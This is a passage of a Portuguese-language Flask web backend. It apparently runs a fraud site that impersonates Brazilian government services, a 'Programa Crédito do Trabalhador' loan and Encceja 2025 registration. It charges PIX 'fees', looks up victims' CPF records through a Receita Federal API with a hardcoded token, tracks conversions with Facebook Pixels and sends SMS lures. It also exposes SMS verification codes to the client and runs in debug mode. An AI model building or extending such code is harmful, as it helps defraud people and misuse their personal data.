                return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
                
        # Se o telefone estiver presente na requisição, garantir que esteja formatado corretamente
        if 'phone' in data and data['phone']:
            # Limpar caracteres não numéricos do telefone
            data['phone'] = ''.join(filter(str.isdigit, data['phone']))
            app.logger.info(f"[PROD] Telefone fornecido na requisição JSON: {data['phone']}")
        
        app.logger.info(f"[PROD] Iniciando criação de pagamento PIX: {data}")
        
        # Usar a API For4Payments especificamente
        from for4payments2 import create_payment_api
        
        try:
            api = create_payment_api()
            app.logger.info("[PROD] API For4Payments inicializada com sucesso")
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar API For4Payments: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento. Tente novamente mais tarde.'}), 500
        
        # Criar o pagamento PIX
        try:
            payment_result = api.create_pix_payment(data)
            app.logger.info(f"[PROD] Pagamento PIX criado com sucesso: {payment_result}")
            
            # Construir resposta
            response = {
                'transaction_id': payment_result.get('id'),
                'pix_code': payment_result.get('pixCode'),
                'pix_qr_code': payment_result.get('pixQrCode'),
                'status': payment_result.get('status', 'pending')
            }
            
            return jsonify(response)
            
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': str(e)}), 400
        except Exception as e:
            app.logger.error(f"[PROD] Erro inesperado ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': 'Erro ao processar pagamento. Tente novamente mais tarde.'}), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao processar requisição: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/verificar-pagamento', methods=['POST'])
@check_referer
def verificar_pagamento():
    try:
        data = request.get_json()
        transaction_id = data.get('transactionId')
        
        if not transaction_id:
            app.logger.error("[PROD] ID da transação não fornecido")
            return jsonify({'error': 'ID da transação é obrigatório', 'status': 'error'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")
        
        # Usar a API de pagamento configurada
        api = get_payment_gateway()
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento: {status_result}")
        
        # Se o pagamento foi confirmado, registrar evento do Facebook Pixel
        if status_result.get('status') == 'completed' or status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']:
            app.logger.info(f"[PROD] Pagamento confirmado, ID da transação: {transaction_id}")
            app.logger.info(f"[FACEBOOK_PIXEL] Registrando evento de conversão para ambos os pixels: 1418766538994503 e 1345433039826605")
            
            # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
            status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605']
        
        return jsonify(status_result)
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'error': f'Erro ao verificar status: {str(e)}', 'status': 'error'}), 500

@app.route('/check-for4payments-status')
@check_referer
def check_for4payments_status():
    try:
        transaction_id = request.args.get('transaction_id')
        
        if not transaction_id:
            app.logger.error("[PROD] ID da transação não fornecido")
            return jsonify({'error': 'ID da transação é obrigatório'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento com For4Payments: {transaction_id}")
        
        # Usar a API For4Payments especificamente
        from for4payments2 import create_payment_api
        
        try:
            api = create_payment_api()
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar API For4Payments: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento.'}), 500
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento com For4Payments: {status_result}")
        
        # Verificar se o pagamento foi aprovado
        if status_result.get('status') == 'completed' or status_result.get('original_status') in ['APPROVED', 'PAID']:
            # Obter informações do usuário dos parâmetros da URL ou da sessão
            nome = request.args.get('nome', '')
            cpf = request.args.get('cpf', '')
            phone = request.args.get('phone', '')
            
            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado via For4Payments. Enviando SMS com link de agradecimento.")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
            bank = request.args.get('bank', 'Caixa Econômica Federal')
            pix_key = request.args.get('pix_key', cpf if cpf else '')
            loan_amount = request.args.get('loan_amount', '4000')
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                # Usando a função especializada para enviar SMS de confirmação de pagamento
                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                if success:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento com For4Payments: {str(e)}")
        return jsonify({'status': 'pending', 'error': str(e)})

@app.route('/send-verification-code', methods=['POST'])
@check_referer
def send_verification_code_route():
    try:
        data = request.json
        phone_number = data.get('phone')

        if not phone_number:
            return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400

        success, result = send_verification_code(phone_number)

        if success:
            # Store the verification code temporarily (in a real app, this should use Redis or similar)
            # For demo purposes, we'll just return it directly (not ideal for security)
            return jsonify({
                'success': True, 
                'message': 'Código enviado com sucesso',
                'verification_code': result  # In a real app, don't send this back to client
            })
        else:
            return jsonify({'success': False, 'message': result}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar código de verificação: {str(e)}")
        return jsonify({'success': False, 'message': 'Erro ao enviar código de verificação'}), 500

@app.route('/atualizar-cadastro', methods=['POST'])
def atualizar_cadastro():
    try:
        app.logger.info("[PROD] Recebendo atualização cadastral")
        # Log form data for debugging
        app.logger.debug(f"Form data: {request.form}")

        # Extract form data
        data = {
            'birth_date': request.form.get('birth_date'),
            'cep': request.form.get('cep'),
            'employed': request.form.get('employed'),
            'salary': request.form.get('salary'),
            'household_members': request.form.get('household_members')
        }

        app.logger.info(f"[PROD] Dados recebidos: {data}")

        # Aqui você pode adicionar a lógica para processar os dados
        # Por enquanto, vamos apenas redirecionar para a página de pagamento
        nome = request.form.get('nome', '')
        cpf = request.form.get('cpf', '')
        phone = request.form.get('phone', '')  # Obter número de telefone do formulário

        return redirect(url_for('payment_update', nome=nome, cpf=cpf, phone=phone))

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
        return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500

@app.route('/sms-config')
def sms_config():
    try:
        # Check SMS API key status
        smsdev_status = bool(os.environ.get('SMSDEV_API_KEY'))
        owen_status = bool(os.environ.get('SMS_OWEN_TOKEN'))

        # Get test result from session if available
        test_result = session.pop('test_result', None)
        test_success = session.pop('test_success', None)

        return render_template('sms_config.html',
                              current_api=SMS_API_CHOICE,
                              smsdev_status=smsdev_status,
                              owen_status=owen_status,
                              test_result=test_result,
                              test_success=test_success)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar configuração SMS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/update-sms-config', methods=['POST'])
def update_sms_config():
    try:
        sms_api = request.form.get('sms_api', 'SMSDEV')

        # In a real application, this would be saved to a database
        # But for this demo, we'll use a global variable
        global SMS_API_CHOICE
        SMS_API_CHOICE = sms_api

        app.logger.info(f"[PROD] API SMS atualizada para: {sms_api}")

        # We would typically use Flask's flash() here, but for simplicity we'll use a session variable
        session['test_result'] = f"Configuração atualizada para {sms_api}"
        session['test_success'] = True

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar configuração SMS: {str(e)}")
        session['test_result'] = f"Erro ao atualizar configuração: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/send-test-sms', methods=['POST'])
def send_test_sms():
    try:
        phone = request.form.get('phone', '')

        if not phone:
            session['test_result'] = "Por favor, forneça um número de telefone válido"
            session['test_success'] = False
            return redirect(url_for('sms_config'))

        # Message template for test
        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."

        # Choose which API to use based on SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            success = send_sms_owen(phone, message)
        else:  # Default to SMSDEV
            success = send_sms_smsdev(phone, message)

        if success:
            session['test_result'] = f"SMS de teste enviado com sucesso para {phone}"
            session['test_success'] = True
        else:
            session['test_result'] = f"Falha ao enviar SMS para {phone}. Verifique o número e tente novamente."
            session['test_success'] = False

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar SMS de teste: {str(e)}")
        session['test_result'] = f"Erro ao enviar SMS de teste: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/encceja')
def encceja():
    """Página do Encceja 2025"""
    return render_template('encceja.html')

@app.route('/inscricao')
def inscricao():
    """Página de inscrição do Encceja 2025"""
    return render_template('inscricao.html')

@app.route('/validar-dados')
def validar_dados():
    """Página de validação de dados do usuário"""
    return render_template('validar_dados.html')

@app.route('/endereco')
def endereco():
    """Página de cadastro de endereço"""
    return render_template('endereco.html')

@app.route('/local-prova')
def local_prova():
    """Página de seleção do local de prova"""
    return render_template('local_prova.html')

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    return render_template('inscricao_sucesso.html')

@app.route('/encceja-info')
def encceja_info():
    """Página com informações detalhadas sobre o Encceja"""
    return render_template('encceja_info.html')

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento_encceja():
    """Página de pagamento da taxa do Encceja"""
    if request.method == 'POST':
        # Obter dados do usuário
        data = request.get_json()
        nome = data.get('nome')
        cpf = data.get('cpf')
        telefone = data.get('telefone')
        
        if not nome or not cpf:
            return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
        
        try:
            # Criar pagamento PIX para a taxa do Encceja
            payment_api = create_payment_api()
            payment_result = payment_api.create_encceja_payment({
                'nome': nome,
                'cpf': cpf,
                'telefone': telefone
            })
            
            # Retornar os dados do pagamento
            return jsonify(payment_result)
        except Exception as e:
            app.logger.error(f"Erro ao criar pagamento: {str(e)}")
            
            # Gerar um código PIX de exemplo para caso de falha na API
            # Isso é necessário apenas para demonstração da interface no ambiente de desenvolvimento
            demo_payment_data = {
                'id': 'demo-123456',
                'pixCode': '00020126870014br.gov.bcb.pix2565pix.example.com/qr/demo/12345',
                # Não incluímos pixQrCode pois o JavaScript na página vai usar uma imagem de exemplo
                'status': 'PENDING'
            }
            
            # Retornar resposta com mensagem de erro, mas com dados de exemplo para a interface
            return jsonify({
                'warning': f"API de pagamento temporariamente indisponível: {str(e)}",
                **demo_payment_data
            }), 200  # Retornar 200 para a página processar normalmente, mas com alerta
    
    # Para requisições GET, renderizar a página de pagamento
    return render_template('pagamento.html')

@app.route('/consultar-cpf')
def consultar_cpf():
    """Busca informações de um CPF na API da Receita Federal"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    # URL da API com o token e CPF
    api_url = f"https://api.exato.digital/receita-federal/cpf?token=268753a9b3a24819ae0f02159dee6724&cpf={cpf}&format=json"
    
    try:
        # Fazer a solicitação para a API
        response = requests.get(api_url)
        data = response.json()
        
        # Extrair os dados necessários
        if 'Result' in data and data.get('TransactionResultType') == 'Success':
            result = data['Result']
            user_data = {
                'cpf': result.get('NumeroCpf', ''),
                'nome': result.get('NomePessoaFisica', ''),
                'dataNascimento': result.get('DataNascimento', '').split('T')[0] if result.get('DataNascimento') else '',
                'situacao': result.get('SituacaoCadastral', '')
            }
            return jsonify(user_data)
        else:
            # Em caso de erro na API
            return jsonify({"error": "CPF não encontrado ou inválido"}), 404
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF: {str(e)}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)